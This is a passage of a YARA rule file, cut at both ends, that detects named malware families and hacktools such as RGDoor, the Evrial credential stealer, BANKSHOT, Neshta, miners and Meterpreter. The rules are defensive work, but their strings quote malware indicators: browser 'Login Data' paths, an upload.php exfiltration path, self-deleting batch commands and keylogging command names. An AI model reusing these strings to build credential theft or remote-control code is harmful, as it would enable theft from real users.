\"1.7\"\n      \n   strings:\n      $x1 = \"WorkDll.dll\" fullword ascii\n      $x2 = \"%userprofile%\\\\Security Center\\\\secriter.dll\" fullword ascii\n      $s1 = \"DLL_PROCESS_ATTACH is called\" fullword ascii\n      $s2 = \"Support Security Accounts Manager For Microsoft Windows.If this service is stopped, any services that depended on it will fail t\" ascii\n      $s3 = \"before CreateRemoteThread\" fullword ascii\n      $s4 = \"CreateRemoteThread Succ\" fullword ascii\n      $s5 = \"Microsoft Security Accounts Manager\" fullword ascii\n      $s6 = \"DoRunRemote\" fullword ascii\n      $s7 = \"AutoRunFun\" fullword ascii\n      $s8 = \"ServiceMain is called\" fullword ascii\n      $s9 = \"DllRegisterServer is called\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule Suckfly_Nidiran_Gen_3_RID2F21 : DEMO EXE FILE G0039 GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c2022e1114b162e79e44d974fd310d53e1bbdd8cb4f217553c1227cafed78855\"\n      hash2 = \"47731c9d985ebc2bd7227fced3cc44c6d72e29b52f76fccbdaddd76cc3450706\"\n      tags = \"DEMO, EXE, FILE, G0039, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"RUN SHELLCODE FAIL\" fullword ascii\n      $x2 = \"RUN PROCESS FAILD!\" fullword ascii\n      $x3 = \"DOWNLOAD FILE FAILD\" fullword ascii\n      $x4 = \"MODIFYCONFIG FAIL!\" fullword ascii\n      $x5 = \"GetFileAttributes FILE FAILD\" fullword ascii\n      $x6 = \"MODIFYCONFIG SUCC!\" fullword ascii\n      $s1 = \"cmd.exe /c %s\" fullword ascii\n      $s2 = \"error to create pipe!\" fullword ascii\n      $s3 = \"%s\\\\%08x.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"ae0f4ebf7e8ce91d6548318a3cf82b7a\" or 1 of ( $x* ) or 2 of them )\n}\n\nrule OilRig_RGDoor_Gen1_RID2D8D : APT DEMO EXE FILE G0049 MIDDLE_EAST {\n   meta:\n      description = \"Detects RGDoor backdoor used by OilRig group\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\"\n      date = \"2018-01-27 10:36:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a9c92b29ee05c1522715c7a2f9c543740b60e36373cb47b5620b1f3d8ad96bfa\"\n      tags = \"APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $c1 = { 00 63 6D 64 24 00 00 00 00 72 00 00 00 00 00 00 00 75 70 6C 6F\n              61 64 24 } \n      $c2 = { 63 61 6E 27 74 20 6F 70 65 6E 20 66 69 6C 65 3A 20 00 00 00 00\n              00 00 00 64 6F 77 6E 6C 6F 61 64 24 } \n      $s1 = \"MyNativeModule.dll\" fullword ascii\n      $s2 = \"RGSESSIONID=\" fullword ascii\n      $s3 = \"download$\" fullword ascii\n      $s4 = \".?AVCHelloWorld@@\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"47cb127aad6c7c9954058e61a2a6429a\" or 1 of ( $c* ) or 2 of them )\n}\n\nrule Elise_Jan18_1_RID2B74 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Elise malware samples - fake Norton Security NavShExt.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/blu3_team/status/955971742329135105\"\n      date = \"2018-01-24 09:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6dc2a49d58dc568944fef8285ad7a03b772b9bdf1fe4bddff3f1ade3862eae79\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"NavShExt.dll\" fullword wide\n      $s2 = \"Norton Security\" fullword wide\n      $a1 = \"donotbotherme\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( pe.imphash ( ) == \"e9478ee4ebf085d1f14f64ba96ef082f\" or ( 1 of ( $s* ) and $a1 ) )\n}\n\nrule MAL_MiniRAT_Gen_Jan18_1_RID2EA8 : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Mini RAT malware inidcators\"\n      author = \"Florian Roth\"\n      reference = \"https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news\"\n      date = \"2018-01-22 11:23:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-05-12\"\n      hash1 = \"091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b\"\n      hash2 = \"b6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d\"\n      hash3 = \"ba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Mini rat\\\\\" ascii\n      $x2 = \"\\\\Projects\\\\ali\\\\Clever Components v7\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and 1 of them\n}\n\nrule MAL_Envrial_Jan18_1_RID2D8C : DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"Detects Encrial credential stealer malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwrhunterteam/status/953313514629853184\"\n      date = \"2018-01-21 10:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9ae3aa2c61f7895ba6b1a3f85fbe36c8697287dc7477c5a03d32cf994fdbce85\"\n      hash2 = \"9edd8f0e22340ecc45c5f09e449aa85d196f3f506ff3f44275367df924b95c5d\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Evrial/master/domen\" wide\n      $a1 = \"\\\\Opera Software\\\\Opera Stable\\\\Login Data\" wide\n      $a2 = \"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\" wide\n      $a3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" wide\n      $a4 = \"\\\\Orbitum\\\\User Data\\\\Default\\\\Login Data\" wide\n      $a5 = \"\\\\Kometa\\\\User Data\\\\Default\\\\Login Data\" wide\n      $s1 = \"dlhosta.exe\" fullword wide\n      $s2 = \"\\\\passwords.log\" wide\n      $s3 = \"{{ <>h__TransparentIdentifier1 = {0}, Password = {1} }}\" fullword wide\n      $s4 = \"files/upload.php?user={0}&hwid={1}\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of them or 2 of ( $s* ) )\n}\n\nrule MAL_unspecified_Jan18_1_RID2F4A : DEMO MAL {\n   meta:\n      description = \"Detects unspecified malware sample\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-01-19 11:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f87879b29ff83616e9c9044bd5fb847cf5d2efdd2f01fc284d1a6ce7d464a417\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s2 = \"ping 192.0.2.2 -n 1 -w %d >nul 2>&1\" fullword ascii\n      $s3 = \"[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\" fullword ascii\n      $s4 = \"start /b \\\"\\\" cmd /c del \\\"%%~f0\\\"&exit /b\" fullword ascii\n      $s5 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\" fullword ascii\n      $s6 = \"%s\\\\%s.bat\" fullword ascii\n      $s7 = \"DEL /s \\\"%s\\\" >nul 2>&1\" fullword ascii\n   condition: \n      filesize < 300KB and 2 of them\n}\n\nrule Turla_Mal_Script_Jan18_1_RID2FD7 : DEMO G0010 MAL RUSSIA SCRIPT T1059 {\n   meta:\n      description = \"Detects Turla malicious script\"\n      author = \"Florian Roth\"\n      reference = \"https://ghostbin.com/paste/jsph7\"\n      date = \"2018-01-19 12:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"180b920e9cea712d124ff41cd1060683a14a79285d960e17f0f49b969f15bfcc\"\n      tags = \"DEMO, G0010, MAL, RUSSIA, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".charCodeAt(i % \" ascii\n      $s2 = \"{WScript.Quit();}\" fullword ascii\n      $s3 = \".charAt(i)) << 10) |\" ascii\n      $s4 = \" = WScript.Arguments;var \" ascii\n      $s5 = \"= \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\\\";var i;\" ascii\n   condition: \n      filesize < 200KB and 2 of them\n}\n\nrule MAL_Neshta_Generic_RID2DC9 : DEMO EXE FILE GEN HIGHVOL MAL {\n   meta:\n      description = \"Detects Neshta malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-01-15 10:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-04-14\"\n      hash1 = \"27c67eb1378c2fd054c6649f92ec8ee9bfcb6f790224036c974f6c883c46f586\"\n      hash1 = \"27c67eb1378c2fd054c6649f92ec8ee9bfcb6f790224036c974f6c883c46f586\"\n      hash2 = \"b7f8233dafab45e3abbbb4f3cc76e6860fae8d5337fb0b750ea20058b56b0efb\"\n      hash3 = \"1954e06fc952a5a0328774aaf07c23970efd16834654793076c061dffb09a7eb\"\n      tags = \"DEMO, EXE, FILE, GEN, HIGHVOL, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"the best. Fuck off all the rest.\" \n      $x2 = \"! Best regards 2 Tommy Salo. [Nov-2005] yours [Dziadulja Apanas]\" fullword ascii\n      $s1 = \"Neshta\" ascii fullword\n      $s2 = \"Made in Belarus. \" ascii fullword\n      $op1 = { 85 c0 93 0f 85 62 ff ff ff 5e 5b 89 ec 5d c2 04 } \n      $op2 = { e8 e5 f1 ff ff 8b c3 e8 c6 ff ff ff 85 c0 75 0c } \n      $op3 = { eb 02 33 db 8b c3 5b c3 53 85 c0 74 15 ff 15 34 } \n      $sop1 = { e8 3c 2a ff ff b8 ff ff ff 7f eb 3e 83 7d 0c 00 } \n      $sop2 = { 2b c7 50 e8 a4 40 ff ff ff b6 88 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or all of ( $s* ) or 3 of them or pe.imphash ( ) == \"9f4693fc0c511135129493f2161d1e86\" )\n}\n\nrule NK_Miner_Malware_Jan18_1_RID2F9D : DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Noth Korean Monero Miner mentioned in AlienVault report\"\n      author = \"Florian Roth (original rule by Chris Doman)\"\n      reference = \"https://cybersecurity.att.com/blogs/labs-research/a-north-korean-monero-cryptocurrency-miner\"\n      date = \"2018-01-09 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"0024e32c0199ded445c0b968601f21cc92fc0c534d2642f2dd64c1c978ff01f3\"\n      hash2 = \"42300b6a09f183ae167d7a11d9c6df21d022a5f02df346350d3d875d557d3b76\"\n      tags = \"DEMO, EXE, FILE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"c:\\\\users\\\\jawhar\\\\documents\\\\\" ascii\n      $x1 = \"C:\\\\Users\\\\Jawhar\\\\documents\\\\\" ascii\n      $x2 = \"The number of processors on this computer is {0}.\" fullword wide\n      $x3 = { 00 00 1F 43 00 3A 00 5C 00 4E 00 65 00 77 00 44\n              00 69 00 72 00 65 00 63 00 74 00 6F 00 72 00 79\n              00 00 } \n      $x4 = \"Le fichier Hello txt n'existe pas\" fullword wide\n      $x5 = \"C:\\\\NewDirectory2\\\\info2\" fullword wide\n      $a = \"82e999fb-a6e0-4094-aa1f-1a306069d1a5\" ascii\n      $b = \"4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS\" ascii\n      $c = \"barjuok.ryongnamsan.edu.kp\" wide ascii\n      $d = \"C:\\\\SoftwaresInstall\\\\soft\" wide ascii\n      $e = \"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\" wide ascii\n      $f = \"C:\\\\Windows\\\\Sys64\\\\updater.exe\" wide ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them\n}\n\nrule CoinHive_Javascript_MoneroMiner_RID3366 : DEMO HIGHVOL SUSP {\n   meta:\n      description = \"Detects CoinHive - JavaScript Crypto Miner\"\n      author = \"Florian Roth\"\n      reference = \"https://coinhive.com/documentation/miner\"\n      date = \"2018-01-04 14:46:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HIGHVOL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"CoinHive.CONFIG.REQUIRES_AUTH\" fullword ascii\n   condition: \n      filesize < 65KB and 1 of them\n}\n\nrule CoinMiner_Strings_RID2DDE : DEMO HIGHVOL SCRIPT SUSP {\n   meta:\n      description = \"Detects mining pool protocol string in Executable\"\n      author = \"Florian Roth\"\n      reference = \"https://minergate.com/faq/what-pool-address\"\n      date = \"2018-01-04 10:50:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-10-26\"\n      tags = \"DEMO, HIGHVOL, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"stratum+tcp://\" ascii\n      $sa2 = \"stratum+udp://\" ascii\n      $sb1 = \"\\\"normalHashing\\\": true,\" \n   condition: \n      filesize < 3000KB and 1 of them\n}\n\nrule XMRIG_Monero_Miner_RID2DC1 : DEMO EXE FILE HIGHVOL SUSP {\n   meta:\n      description = \"Detects Monero mining software\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/xmrig/xmrig/releases\"\n      date = \"2018-01-04 10:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-11-10\"\n      hash1 = \"5c13a274adb9590249546495446bb6be5f2a08f9dcd2fc8a2049d9dc471135c0\"\n      hash2 = \"08b55f9b7dafc53dfc43f7f70cdd7048d231767745b76dc4474370fb323d7ae7\"\n      hash3 = \"f3f2703a7959183b010d808521b531559650f6f347a5830e47f8e3831b10bad5\"\n      tags = \"DEMO, EXE, FILE, HIGHVOL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"'h' hashrate, 'p' pause, 'r' resume\" fullword ascii\n      $s2 = \"--cpu-affinity\" ascii\n      $s3 = \"set process affinity to CPU core(s), mask 0x3 for cores 0 and 1\" ascii\n      $s4 = \"password for mining server\" fullword ascii\n      $s5 = \"XMRig/%s libuv/%s%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d or uint16 ( 0 ) == 0x457f ) and filesize < 10MB and 2 of them\n}\n\nrule XMRIG_Monero_Miner_Config_RID3076 : DEMO FILE SUSP {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files config.json, config.json\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/xmrig/xmrig/releases\"\n      date = \"2018-01-04 12:40:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"031333d44a3a917f9654d7e7257e00c9d961ada3bee707de94b7c7d06234909a\"\n      hash2 = \"409b6ec82c3bdac724dae702e20cb7f80ca1e79efa4ff91212960525af016c41\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"cpu-affinity\\\": null,   // set process affinity to CPU core(s), mask \\\"0x3\\\" for cores 0 and 1\" fullword ascii\n      $s5 = \"\\\"nicehash\\\": false                  // enable nicehash/xmrig-proxy support\" fullword ascii\n      $s8 = \"\\\"algo\\\": \\\"cryptonight\\\",  // cryptonight (default) or cryptonight-lite\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x0a7b or uint16 ( 0 ) == 0x0d7b ) and filesize < 5KB and 1 of them\n}\n\nrule VBS_dropper_script_Dec17_1_RID30AE : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects a supicious VBS script that drops an executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-01-01 12:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TVpTAQEAAAAEAA\" \n      $s2 = \"TVoAAAAAAAAAAA\" \n      $s3 = \"TVqAAAEAAAAEAB\" \n      $s4 = \"TVpQAAIAAAAEAA\" \n      $s5 = \"TVqQAAMAAAAEAA\" \n      $a1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 600KB and $a1 and 1 of ( $s* )\n}\n\nrule RemCom_RemoteCommandExecution_RID3292 : DEMO HKTL T1021_002 {\n   meta:\n      description = \"Detects strings from RemCom tool\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/3014995bdf04ed22452109136f759f7e83a5aab0cf2a79e6b787ac0f242c66c4/detection\"\n      date = \"2017-12-28 14:10:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, HKTL, T1021_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" \n      $ = \"%s\\\\pipe\\\\%s%s%d%s\" \n      $ = \"\\\\ADMIN$\\\\System32\\\\%s%s\" \n   condition: \n      1 of them\n}\n\nrule PowerShell_Suite_Hacktools_Gen_Strings_RID3648 : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects strings from scripts in the PowerShell-Suite repo\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/FuzzySecurity/PowerShell-Suite\"\n      date = \"2017-12-27 16:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"79071ba5a984ee05903d566130467483c197cbc2537f25c1e3d7ae4772211fe0\"\n      hash2 = \"db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5\"\n      hash3 = \"4f51e7676a4d54c1962760ca0ac81beb28008451511af96652c31f4f40e8eb8e\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"[!] NtCreateThreadEx failed..\" fullword ascii\n      $ = \"[?] Executing mmc..\" ascii\n      $ = \"[!] This method is only supported on 64-bit!\" fullword ascii\n      $ = \"$LNK = [ShellLink.Shortcut]::FromByteArray($LNKHeader.GetBytes())\" fullword ascii\n      $ = \"$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)\" fullword ascii\n      $ = \"[!] Unable to open process (as Administrator), this may require SYSTEM access.\" fullword ascii\n      $ = \"[!] Error, NTSTATUS Value: \" ascii\n      $ = \"[!] UAC artifact: \" ascii\n      $ = \"[>] Process dump success!\" ascii\n      $ = \"[!] Process dump failed!\" ascii\n      $ = \"[+] Eidolon entry point:\" fullword ascii\n      $ = \"Wait for shellcode to run\" fullword ascii\n      $ = \"$Command = Read-Host \\\"`nSMB shell\\\"\" fullword ascii\n      $ = \"Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.\" fullword ascii\n      $ = \"Invoke-CreateProcess -Binary C:\\\\Windows\\\\System32\\\\\" ascii\n      $ = \"[?] Thread belongs to: \" ascii\n      $ = \"[?] Operating system core count: \" ascii\n      $ = \"[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege\" fullword ascii\n      $ = \"Calling Advapi32::OpenProcessToken --> LSASS\" ascii\n      $ = \"[!] Mmm, something went wrong! GetLastError returned:\" ascii\n      $ = \"if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')\" fullword ascii\n   condition: \n      filesize < 100KB and 1 of them\n}\n\nrule PowerShell_Suite_Eidolon_RID30A8 : DEMO FILE SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/FuzzySecurity/PowerShell-Suite\"\n      date = \"2017-12-27 12:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5\"\n      tags = \"DEMO, FILE, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"[+] Eidolon entry point:\" ascii\n      $ = \"C:\\\\PS> Start-Eidolon -Target C:\\\\Some\\\\File.Path -Mimikatz -Verbose\" fullword ascii\n      $ = \"[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 13000KB and 1 of them\n}\n\nrule HiddenCobra_BANKSHOT_Gen_RID2F76 : DEMO EXE FILE G0032 GEN MAL NK {\n   meta:\n      description = \"Detects Hidden Cobra BANKSHOT trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\n      date = \"2017-12-26 11:58:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-06-10\"\n      hash1 = \"89775a2fbb361d6507de6810d2ca71711d5103b113179f1e1411ccf75e6fc486\"\n      hash2 = \"8b2d084a8bb165b236d3e5436d6cb6fa1fda6431f99c4f34973dc735b4f2d247\"\n      hash3 = \"b766ee0f46c92a746f6db3773735ee245f36c1849de985bbc3a37b15f7187f24\"\n      tags = \"DEMO, EXE, FILE, G0032, GEN, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" fullword wide\n      $s2 = \"rHTTP/1.1 200 Connection established\" fullword wide\n      $s3 = \"Proxy-Connection: keep-alive\" fullword wide\n      $s4 = \"\\\\msncf.dat\" wide\n      $s5 = \"msvcru32.bat\" fullword ascii\n      $s6 = \"reg delete \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /v \\\"%s\\\" /f\" fullword ascii\n      $s7 = \"MXINFO.DLL\" fullword ascii\n      $s8 = \"usrvc32.bat\" fullword ascii\n      $s9 = \"ping -n 1 127.0.0.1\" fullword ascii\n      $s10 = \"%sd.e%sc \\\"%s > %s 2>&1\\\"\" ascii fullword\n      $s11 = \"DWS*.tmp\" ascii fullword\n      $s12 = \"CS*.tmp\" fullword wide\n      $s13 = \"WM*.tmp\" fullword wide\n      $x1 = \"CgpaipIddwspwe32Hnaehsdi\" fullword ascii\n      $x2 = \"RpiPmtiCdopIsgpao\" fullword ascii\n      $x3 = \"RpiLtnodlhOtgpcidgyA\" fullword ascii\n      $x4 = \"LatiQdgHtnrwpDbupci\" fullword ascii\n      $x6 = \"\\\\system32\\\\msncf.dat\" ascii\n      $x7 = \"GprthipgHpgktcpCigwSanowpgA\" fullword ascii\n      $a1 = \"live.dropbox.com\" fullword ascii\n      $a2 = \"tatadocomo.yahoo.com\" fullword ascii\n      $a3 = \"widgets.twimg.com\" fullword ascii\n      $a4 = \"history.paypal.com\" fullword ascii\n      $a5 = \"www.bitcoin.org\" fullword ascii\n      $a6 = \"web.whatsapp.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 2 of ( $s* ) or 4 of ( $a* ) )\n}\n\nrule Armitage_msfconsole_RID2ED3 : DEMO HKTL {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 11:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-08-18\"\n      hash1 = \"662ba75c7ed5ac55a898f480ed2555d47d127a2d96424324b02724b3b2c95b6a\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\umeterpreter\\\\u >\" ascii\n      $s3 = \"^meterpreter >\" fullword ascii\n      $s11 = \"\\\\umsf\\\\u>\" ascii\n   condition: \n      filesize < 1KB and 2 of them\n}\n\nrule Armitage_MeterpreterSession_Strings_RID3556 : DEMO HKTL {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 16:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-05-19\"\n      hash1 = \"b258b2f12f57ed05d8eafd29e9ecc126ae301ead9944a616b87c240bf1e71f9a\"\n      hash2 = \"144cb6b1cf52e60f16b45ddf1633132c75de393c2705773b9f67fce334a3c8b8\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"session.meterpreter_read\" fullword ascii\n      $s2 = \"sniffer_dump\" fullword ascii\n      $s3 = \"keyscan_dump\" fullword ascii\n      $s4 = \"MeterpreterSession.java\" fullword ascii\n   condition: \n      filesize < 30KB and 1 of them\n}\n\nrule Armitage_OSX_RID2B94 : DEMO HKTL MACOS {\n   meta:\n      description = \"Detects Armitage component\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-12-24 09:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2680d9900a057d553fcb28d84cdc41c3fc18fd224a88a32ee14c9c1b501a86af\"\n      hash2 = \"b7b506f38d0553cd2beb4111c7ef383c821f04cee5169fed2ef5d869c9fbfab3\"\n      tags = \"DEMO, HKTL, MACOS\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"resources/covertvpn-injector.exe\" fullword ascii\n      $s10 = \"resources/browserpivot.x64.dll\" fullword ascii\n      $s17 = \"resources/msfrpcd_new.bat\" fullword ascii\n   condition: \n      filesize < 6000KB and 1 of them\n}\n\nrule Lazarus_Dec_17_1_RID2CB5 : APT DEMO FILE G0032 NK T1218_001 {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new\"\n      date = \"2017-12-20 10:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48\"\n      tags = \"APT, DEMO, FILE, G0032, NK, T1218_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::DataSpace/Storage/MSCompressed/Transform/\" ascii\n      $s2 = \"HHA Version 4.\" ascii\n      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F\n              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 } \n      $s4 = \"bUEeYE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5449 and filesize < 4000KB and all of them\n}\n\nrule 